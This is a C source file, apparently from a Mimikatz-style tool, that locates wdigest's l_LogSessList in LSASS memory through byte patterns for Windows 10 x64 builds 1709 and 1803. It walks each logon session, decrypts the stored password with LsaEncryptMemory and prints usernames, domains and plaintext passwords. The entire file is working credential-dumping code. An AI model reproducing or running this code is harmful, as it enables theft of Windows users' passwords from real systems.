#include "stdafx.h"
#include "wdigest.h"
#include "process.h"
#include "cng.h"

static IMAGE_PATTERN wdigest_l_LogSessList[] = {
	{0x000a00003fab000f, 0x004c21840ffa3b48, -4 }, //win10x64 1709
	{0x000a000042ee0001, 0x004beb840ff83b48, -4 }, //win10x64 1803
	{0, 0, 0}
};

LPVOID Find_l_LogSessList()
{
	/* 查找wdigest!l_LogSessList地址
	.text:0000000180001408 FF 15 82 D5 02 00                             call    cs:__imp_RtlEnterCriticalSection
	.text:000000018000140E 48 8B 3D 8B 39 03 00                          mov     rdi, cs:?l_LogSessList@@3U_LIST_ENTRY@@A ; _LIST_ENTRY l_LogSessList
	.text:0000000180001415 48 8D 15 84 39 03 00                          lea     rdx, ?l_LogSessList@@3U_LIST_ENTRY@@A ; _LIST_ENTRY l_LogSessList
	.text:000000018000141C 48 3B FA                                      cmp     rdi, rdx
	.text:000000018000141F 0F 84 21 4C 00 00                             jz      loc_180006046
	.text:0000000180001425 41 8B 0E                                      mov     ecx, [r14]
	以SpInstanceInit地址结束，搜索指定序列就可以找到相应指针了。
	*/

	HMODULE hModule = LoadLibraryW(L"wdigest");
	LPVOID  lpLogSessList = NULL;
	RETN_IF(hModule == NULL, L"LoadLibraryW", NULL);

	FARPROC lpSpInstanceInit = GetProcAddress(hModule, "SpInstanceInit");
	GOTO_IF(hModule == NULL, L"GetProcAddress", cleanup);

	//MESSAGE(L"wdigest.dll [0x%p], lpSpInstanceInit [0x%p]\r\n",	hModule, lpSpInstanceInit);
	
	lpLogSessList = FindPatternFromModule(hModule, (PIMAGE_PATTERN)&wdigest_l_LogSessList, hModule, lpSpInstanceInit, 0);
cleanup:
	FreeLibrary(hModule);
	return lpLogSessList;
}

BOOL ReadLsassLSAString(IN PLSA_UNICODE_STRING lpUStr, OUT LPBYTE lpBuff)
{
	if (lpUStr->Buffer == NULL)
		return FALSE;
	BOOL bRet = ReadLsassMemory(lpUStr->Buffer, lpBuff, lpUStr->Length + 2);
	RETN_IF(!bRet, L"ReadProcessMemory", FALSE);
	return TRUE;
}

BOOL ReadLsassLSABuffer(IN PLSA_UNICODE_STRING lpUStr, OUT LPBYTE lpBuff)
{
	if (lpUStr->Buffer == NULL)
		return FALSE;
	BOOL bRet = ReadLsassMemory(lpUStr->Buffer, lpBuff, lpUStr->MaximumLength);
	RETN_IF(!bRet, L"ReadProcessMemory", FALSE);
	return TRUE;
}

#define MAX_NAME 64
#define MAX_PASSWORD_BUFF 256
BOOL Wdigest_LogSessList_Dump()
{
	LPVOID lpLogSessList = Find_l_LogSessList();
	BOOL   bRet;
	RETN_MSG_IF(lpLogSessList == NULL, FALSE, L"cant find wdigest!l_LogSessList\r\n");
	MESSAGE(L"wdigest!l_LogSessList in lsass 0x%p\r\n", lpLogSessList);

	KIWI_WDIGEST_LIST_ENTRY  szWdigestListEntry = { 0 };
	PKIWI_WDIGEST_LIST_ENTRY lpListEntry        = &szWdigestListEntry;
	bRet = ReadLsassMemory(lpLogSessList, lpListEntry, sizeof(PKIWI_WDIGEST_LIST_ENTRY));
	RETN_IF(!bRet, L"ReadProcessMemory", FALSE);

	TCHAR szUserName[MAX_NAME], szDomain[MAX_NAME], szDnsDomain[MAX_NAME];
	BYTE  szEncPassword[MAX_PASSWORD_BUFF] = { 0 };
	//遍历链表
	do {
		bRet = ReadLsassMemory(lpListEntry->Flink,
			&szWdigestListEntry, sizeof(szWdigestListEntry));
		RETN_MSG_IF(lpLogSessList == NULL, FALSE, L"wdigest list entry list incomplete or read error?\r\n");
		//MESSAGE(L"Blink:%p,Flink:%p\r\n", lpListEntry->Blink, lpListEntry->Flink);
		if (!ReadLsassLSAString(&lpListEntry->UserName, (LPBYTE)&szUserName))
			szUserName[0] = 0;
		if (!ReadLsassLSAString(&lpListEntry->Domain, (LPBYTE)&szDomain))
			szDomain[0] = 0;
		if (!ReadLsassLSAString(&lpListEntry->DnsDomain, (LPBYTE)&szDnsDomain))
			szDnsDomain[0] = 0;
		MESSAGE(L"%s\\%s (%s):", szUserName, szDomain, szDnsDomain);
		bRet = ReadLsassLSAString(&lpListEntry->EncryptedPassword, (LPBYTE)&szEncPassword);
		if (!bRet)
		{
			MESSAGE(L"[]\r\n");
			continue;
		}
		LsaEncryptMemory(szEncPassword, lpListEntry->EncryptedPassword.Length, 0);
		MESSAGE(L"[%s]\r\n", (LPWSTR) &szEncPassword);
	} while (lpListEntry->Flink != lpLogSessList);
	return TRUE;
}